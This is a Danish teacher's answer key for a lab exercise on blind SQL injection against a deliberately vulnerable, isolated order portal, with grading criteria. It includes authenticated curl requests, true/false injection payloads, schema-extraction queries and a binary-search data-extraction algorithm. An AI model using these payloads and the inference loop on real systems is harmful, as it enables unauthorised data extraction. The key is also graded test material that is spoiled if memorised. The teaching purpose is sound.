# Opgave 14 · Request Forge

**Lærerfacit – må ikke kopieres til elevens operator eller publiceres som elevmateriale.**

Eleven er offensiv tester for Cybercon og skal udlede en intern beviskode fra
Nordteles fiktive ordreportal. Opgaven skifter fokus fra reparation i opgave 13 til
requestrekonstruktion, hypoteser, blind SQL-injektion og begrænset automatisering.
Planlagt til cirka 240 minutter. Forudsætninger: curl, HTTP-status og headers,
JSON, grundlæggende SELECT/WHERE samt en Python-løkke.

## Læringsmål og gennemførelse

| Del | Tid | Eleven skal demonstrere |
|---|---:|---|
| Mandat og baseline | 30 min | Skelne tilladt mål fra CRA; gemme normal request/response |
| Manipulation og fejlkategorier | 35 min | Gensende request med korrekt cookie, CSRF og JSON |
| Kontrolleret påvisning | 35 min | Gentaget sand/falsk-par med én ændret betingelse |
| Blind inferens og eget script | 95 min | Udlede schema og beviskode med afgrænsede forespørgsler |
| Bevis, rapport og mundtlig kontrol | 45 min | Reproducerbar kæde, requestantal og præcise begrænsninger |

Frigiv `request-forge` individuelt under Command Center → Elever og opgaver,
efter installation og labaccept. Katalogets fjortende opgave kræver altid individuel
frigivelse, også uden en åben klassesession. Den udløser ikke Cybercons alarm fra
opgave 13. Start sker gennem den normale missionsknap. Et eksisterende sololab —
eller et kørende holdlab — skal håndteres gennem CRA's almindelige, bekræftede
opgaveskift; et holdlab skal stoppes først.

Eleven starter i `/home/cra/academy/request-forge/README.txt`. Terminal med curl
og Python 3 er tilstrækkelig. Ved grafisk profil kan Network-fanen bruges til
opsamling og genafsendelse; ekstra proxyværktøjer er ikke en forudsætning.

## Facit: normal HTTP-kæde

Brug kun egen isolerede mål-IP. Følgende er lærerens referenceforløb, ikke et
elevmanuskript. `MÅL-IP` udskiftes med den adresse, CRA viser.

```bash
BASE='http://MÅL-IP:8081'
curl -sS --max-time 5 -D login.headers -c cookies.txt \
  -H 'Content-Type: application/json' \
  --data-binary '{"username":"auditor","password":"nordtele-lab-only"}' \
  "$BASE/api/login" > login.json
CSRF=$(python3 -c 'import json; print(json.load(open("login.json"))["csrf"])')
printf '%s' '{"reference":"NT-1042"}' > search.json
curl -sS --max-time 5 -D search.headers -b cookies.txt \
  -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" \
  --data-binary @search.json "$BASE/api/search" > search.response.json
cat search.response.json
```

Forventet: HTTP 200 og `{"matched": true}`. `NT-0000` giver HTTP 200 med
`false`. Uden cookie fås 401; forkert/manglende CSRF giver 403; forkert
Content-Type giver 415. Et forkert JSON-felt giver 400. Login er ikke sårbart
for SQL-injektion. GET på søge-endpointet giver 405.

Eleven skal identificere både cookie og token som sessionsbundne. Token fra et
andet login accepteres ikke sammen med den gamle cookie. En session udløber efter
en time eller portalgenstart. GET `/api/session` viser token for gyldig session.

## Facit: fra manipulation til blind inferens

Det sårbare felt er `reference` i JSON-body til POST `/api/search`. Serveren
indsætter feltets tekst direkte i en SQLite-SELECT, som starter således:

```sql
SELECT 1 FROM orders
WHERE tenant='demo' AND reference='<INPUT>' AND visible=1
```

Følgende to værdier, korrekt JSON-kodet i feltet, giver det kontrollerede par:

```text
NT-1042' AND (1=1) --
NT-1042' AND (1=2) --
```

Begge requests er autentificerede og syntaktisk gyldige. De svarer henholdsvis
`matched: true` og `matched: false`. Gentag i modsat rækkefølge. Apostroffen
afslutter strengen, AND tilføjer en betingelse, og kommentaren neutraliserer
den oprindelige slutning. En søgning efter et ikkeeksisterende ordrenummer kan
give false i begge tilfælde og er derfor en dårlig baseline til dette AND-par.

API'et afslører kun, om SQL returnerede mindst én række. Selv UNION returnerer
ikke kolonneindhold til klienten. SQL-fejl samles som `invalid_search` uden
servertrace. Fejlstatus må ikke fortolkes som false i elevens script.

En betingelse som `sqlite_version() LIKE '3.%'` kan afprøve databasetypen.
Systemkatalogets `name` og `sql` kan derefter udledes som tekst. Det er faktiske
SQLite-schemafelter, ikke simulerede spor. Se [SQLite: schema table](https://www.sqlite.org/schematab.html).

Lærerens relevante udtryk er:

```sql
SELECT name FROM sqlite_schema
WHERE type='table' AND name!='orders' ORDER BY name LIMIT 1

SELECT sql FROM sqlite_schema WHERE name='audit_vault'

SELECT proof_code FROM audit_vault WHERE id=1
```

De udledte navne er `audit_vault` og `proof_code`. Koden er 16 små hextegn og
afhænger af det konkrete labs ejer og generation. Ingen fast kode er facit.
Længde kan udledes med `length`, tegn med `unicode(substr(...,position,1))`.
ASCII-grænsen 127 er tilstrækkelig til dette schemas navne og kode.

Pseudokoden under viser lærerens referencealgoritme. `oracle` skal sende en
normal request med `reference` sat til `NT-1042' AND (<betingelse>) -- `, kræve
HTTP 200 og returnere JSON-feltets booleske værdi. Den skal tælle requests,
stoppe ved 10.000, sætte timeout og afvise alle andre responsformer.

```python
def udled_tal(udtryk, maksimum):
    assert oracle(f"({udtryk}) >= 0")
    assert oracle(f"({udtryk}) <= {maksimum}")
    lav, hoej = 0, maksimum
    while lav < hoej:
        midt = (lav + hoej) // 2
        if oracle(f"({udtryk}) > {midt}"):
            lav = midt + 1
        else:
            hoej = midt
    assert oracle(f"({udtryk}) = {lav}")
    return lav

def udled_tekst(select_udtryk, maksimum=256):
    laengde = udled_tal(f"length(({select_udtryk}))", maksimum)
    return "".join(chr(udled_tal(
        f"unicode(substr(({select_udtryk}),{position},1))", 127
    )) for position in range(1, laengde + 1))
```

Dette kører mod et virkeligt HTTP-endpoint i
`node/test_request_forge.py::test_actual_blind_discovery_and_proof`, inklusive
schemaudledning og aflevering. Testen bruger udelukkende syntetiske værdier og
en loopbackserver; den er ikke en VM-accepttest.

Til sidst sendes `{"code":"<udledt værdi>"}` til POST `/api/proof` med cookie og
CSRF-header. Et korrekt fund returnerer elevens flag; forkert kode giver 403.
En injektionsstreng i code-feltet giver ingen genvej. Bevis-endpointet sammenligner
direkte med den korrekte kode og udfører ikke SQL.

## Bedømmelse

CRA giver **700 point én gang** for flaget. Det beviser kendskab til resultatet.
Lærerens faglige bedømmelse af rapporten er separat og registreres ikke automatisk:

| Område | Vægt | Krav |
|---|---:|---|
| HTTP-forståelse | 20 % | Komplet request og forklaring af nødvendige dele |
| Kontrolleret påvisning | 25 % | Gyldigt, gentaget kontrolpar og forstået SQL-kontekst |
| Blind udledning | 30 % | Schemafund, eget script, grænser og kontrol af resultat |
| Beviser og afgrænsning | 25 % | Genkørsel, requestantal, kilder og præcist beskrevet omfang |

Et kopieret payload eller en sqlmap-kørsel opfylder ikke kravet om eget script
og forklaring. Alternative korrekte manuelle/inferensmetoder accepteres. Stil
mundtligt ét nyt spørgsmål til elevens oracle, eksempelvis en længdebetingelse,
og bed eleven forudsige udfaldet før afsendelse.

Bonus: sammenlign lineær søgning med binær søgning i antal requests; tilføj
genoptagelse efter sessionudløb; eller kontroller alle udledte tegn med en anden
metode. Ingen ekstra mål, rettigheder eller angrebsomfang er nødvendige.

## Drift, nulstilling og grænser

Portalen bruger Python-standardbiblioteket og SQLite i mål-VM'en. Ingen nye
pakker. Databasen indeholder kun syntetiske ordreposter og beviskoden. Appen kører
som www-data med systemd-begrænsninger. Der gives ingen mål-SSH til eleven.
Forespørgsler har længde-, tråd- og SQL-instruktionsgrænser. SQL-authorizer tillader
kun læsning og udvalgte funktioner; filadgang, extensions og databaseændringer
er ikke del af opgaven. [SQLite dokumenterer, at progress-handleren kan afbryde
en igangværende forespørgsel](https://www.sqlite.org/c3ref/progress_handler.html).

Det er en bevidst sårbar øvelse, ikke en produktionsportal. Den må kun installeres
gennem labopskriften på den isolerede mål-VM. Ingen proceslytning på kontrolplanets
offentlige interface. Stop/start genskaber samme kode fra det generationsbundne
flag, men rydder sessioner. Reset giver ny kode og nyt flag; score gentildeles ikke.

Lærerfacit leveres kun i repositoryets lærermappe. Elevpakken indeholder README,
mandat og tom rapport, hverken serversource, database, solver eller løsning.
Materialet er originalt CRA-øvelsesindhold; ingen ny distributionslicens er valgt.
Den tilsigtede faglige sværhedsgrad skal efterprøves med en elevpilot.
